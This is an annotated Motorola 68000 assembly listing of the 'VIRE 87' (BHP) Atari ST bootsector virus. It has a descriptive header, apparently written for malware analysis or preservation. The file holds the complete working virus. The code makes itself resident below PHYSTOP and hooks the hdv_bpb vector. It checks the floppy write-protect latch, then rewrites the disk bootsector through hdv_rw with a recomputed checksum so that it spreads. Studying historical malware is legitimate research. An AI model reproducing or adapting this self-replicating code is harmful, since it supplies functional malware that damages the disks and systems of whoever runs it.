; Steal template
; Known names: Munchner 'VIRE 87', Bayrische Hacker Post (BHP) Virus.
; Symptoms: replicates and increment generation counter
; Replication: on A or B only, when Getbpb() is called, if floppy is not write protected and the bootsector starts with 0x0000 (kind of bad shortcut for non-executable)
; Resident address: PHYSTOP - 0x200
; Bootcode size: 166 bytes 
; Bootcode start: 0x1E
; Stealth location: N/A
; Attached vectors: hdv_bpb
; Reset resistance: No
; TOS compatible: 1.0 only for the non patched version
;
; What's special? 
; - The bootsector 'branch' (normally the 2 first bytes) is unusual (DC.B 'VIRE 87', 0) and the real branch starts at byte 8: 0x6014
; - It uses a TOS address specific regiser (write-protect latch) to detect if the floppy is write protected before trying to replicate
; - It used a smart way to replicate and write the patched bootsector why avoid calling FLOPWR (and being detected) and using the hdv_rw register
; - It mutates as the generation counter is stored in the bootsector

; ----------------------------------------------------------------------------------------------------------
; Registers
; ----------------------------------------------------------------------------------------------------------
PHYSTOP                         equ $42E                ; $00042E|long |Physical top of RAM 0x100000 on 1MB ST                  |phystop
HDV_BPB                         equ $472                ; $000472|long |Vector for getbpb for hard disk                         |hdv_bpb
HDV_RW                          equ $476                ; $000476|long |Vector for read/write routine for hard disk             |hdv_rw
                                                        ; This vector is used when Rwabs() is called. A value of 0 here indicates that no hard disk is attached.
                                                        ; Applications installing themselves here should expect parameters to be located on the stack as they would
                                                        ; be for the actual function call beginining at 4(sp). If the installed process services the call it should RTS,
                                                        ; otherwise, leaving the stack intact, should JMP through the old vector value
DISKBUFP                        equ $4C6                ; $0004C6|long |Pointer to 1024-byte disk buffer                        |_dskbufp

; TOS dependent, on TOS 1.0, that's wplatch, tos 1.04: https://github.com/th-otto/tos1x/blob/master/glue/tos104us.map#L480
TOS100 equ 1
    ifd TOS100   
WPLATCH equ $9B4 
    endc
    ifd TOS104
WPLATCH equ $9F8  
    endc        
    ifd TOS106
WPLATCH equ $A38  
    endc  
    ifd TOS162
WPLATCH equ $A38  
    endc      
    ifd TOS206
WPLATCH equ $15B6  
    endc              

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
BOOT_CHK                        equ $1234

; ----------------------------------------------------------------------------------------------------------
; Pointers
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_OLD_VECTOR_ADDR         equ (HDV_BPB_OLD_VECTOR-BOOTSECTOR_BEGIN)
GENERATION_ADDR                 equ (GENERATION-BOOTSECTOR_BEGIN)
HDV_BPB_VECTOR_ADDR             equ (HDV_BPB_VECTOR-BOOTSECTOR_BEGIN)

; ----------------------------------------------------------------------------------------------------------
; Variables
; ----------------------------------------------------------------------------------------------------------
BOOTSECTOR_BEGIN                equ START-$1E
BOOTSECTOR_BPS                  equ BOOTSECTOR_BEGIN+$0B

; BOOTSECTOR_BEGIN:
;    # DC.B    'VIRE 87',0
;    # BRA.S    START
;    # ASL.B    #4,D0
;    # ANDI.B    #$0,D2
;    # ANDI.W    #$A0,$FFFFFFF9(A0,D0.W)
;    # BTST    D2,D0
;    # BTST    D4,D0
;    # ANDI.B    #$0,D0

START:
        MOVEA.L   PHYSTOP.W,A1                      ; A1 = PHYSTOP (0x100000 on 1MB ST)
        SUBA.L    #$200,A1                          ; A1 = PHYSTOP - 512 bytes

        MOVEA.L   A1,A2                             ; A2 = A1
        LEA       BOOTSECTOR_BEGIN(PC),A0           ; A0 = bootsector start in DISKBUF
        MOVE.W    #$FF,D0                           ; for d0 = 255 to 0
.copy:
        MOVE.W    (A0)+,(A1)+                       ; copy 512 bytes of bootsector to PHYSTOP - 0x200
        DBF       D0,.copy

        ; save old hdv_bpb vector
        MOVE.L    HDV_BPB.W,HDV_BPB_OLD_VECTOR_ADDR(A2)

        ; increment generation (never read after)
        ADDQ.L    #1,GENERATION_ADDR(A2)               
        
        LEA       HDV_BPB_VECTOR_ADDR(A2),A0        ; A0 = @HDV_BPB_VECTOR
        MOVE.L    A0,HDV_BPB.W                      ; Set new hdv_bpb vector
        RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; when Getpbp( dev ) is called
; Applications installing themselves here should expect parameters to be located on the stack as they would
; be for the actual function call beginning at 4(sp)
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVEA.L   (sp)+,A5                          ; A5 = pop top of stack return address value, and keep it
        MOVEA.L   HDV_BPB_OLD_VECTOR(PC),A0         ; A0 = old hdv_bpb address
        JSR       (A0)                              ; branch to old vector and come back

        MOVE.L    D0,-(sp)                          ; add to stack D0 = address of current BPB struct returned by Getbpb(dev)
                                                    ; that will be used to reset D0 at the end
        MOVE.W    $4(sp),D0                         ; Get first Getbpb parameter: dev
        CMPI.W    #$2,D0                            ; if dev >= 2 , that's not a floppy
        BGE.S     .do_nothing                       ; do nothing

        LEA       WPLATCH.W,A0                      ; wplatch 0000 for rw, 00FF for write protected, word 1: A, word 2: B
        TST.B     0(A0,D0.W)                        ; if 0, not write protected
        BNE.S     .do_nothing
                                                    ; Memory addresses that are used by the floppies on TOS 1.0 US only
                                                    ; $9B0.W*     Retrycnt (Retry count)
                                                    ; $9B2.W*     Write Protect status
                                                    ; $9B4.W*     wplatch / wp floppy write protect latch variable)
                                                    ; $9C6  *     Sector number
                                                    ; $9CC.B*     CDMA (DMA buffer for bad sector list)
                                                    ; $9CD.B*     DMA high
                                                    ; $9CE.B*     DMA mid
                                                    ; $9CF.B*     DMA low
                                                    ; $A06  *     DSB Drive A        

        MOVEA.L   DISKBUFP.W,A0                     ; A0 = floppy buffer
        TST.W     (A0)                              ; test bootsector starts with 0x0000, means non executable?
        BNE.B     .do_nothing

        MOVE.W    #$12,D0                           ; d0 = 18
        ADDA.L    #$B,A0                            ; a0 = DISKBUFP + 11
        LEA.L     BOOTSECTOR_BPS(PC),A1             ; a1 = BOOTSECTOR_BPS
.copy:
        MOVE.B    (A0)+,(A1)+                       ; copy 18 bytes DISKBUFP[11:29] => floppy params from serial to NHID to BOOTSECTOR_BPS
        DBF       D0,.copy                          ; (itself before bootcode)

        CLR.W     D1                                ; clear d1
        MOVE.W    #$FE,D0                           ; for d0 = 254 to 0
        LEA       BOOTSECTOR_BEGIN(PC),A0
.calc_boot_checksum:
        ADD.W     (A0)+,D1                          ; compute word boot checksum
        DBF       D0,.calc_boot_checksum
        MOVE.W    #BOOT_CHK,D0
        SUB.W     D1,D0
        MOVE.W    D0,(A0)                           ; write adjusted checksum to floppy buffer

        MOVE.W    4(sp),-(sp)                       ; move stack
        CLR.W     -(sp)                             ; dev - 0 (A:) 
        MOVEQ     #1,D0                             ; recno = 1
        MOVE.W    D0,-(sp)                          ; count = 1
        PEA       BOOTSECTOR_BEGIN(PC)              ; buf = bootsector
        MOVE.W    D0,-(sp)                          ; mode = 1 (write)
        MOVEA.L   HDV_RW.W,A0
        JSR       (A0)                              ; call LONG Rwabs( word mode, long buf, word count, word recno, word dev )
        ADDQ.L    #8,sp                             ; fix stack of 12 bytes due of RWABS call
        ADDQ.L    #4,sp
.do_nothing:
        MOVE.L    (sp)+,D0                          ; reset BPB structure in D0
        JMP       (A5)                              ; jmp to original return Getbb() return address

; ----------------------------------------------------------------------------------------------------------
; Variables
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_OLD_VECTOR:
        DC.L       $00FC0FCA
GENERATION:
        DC.L       $00000014
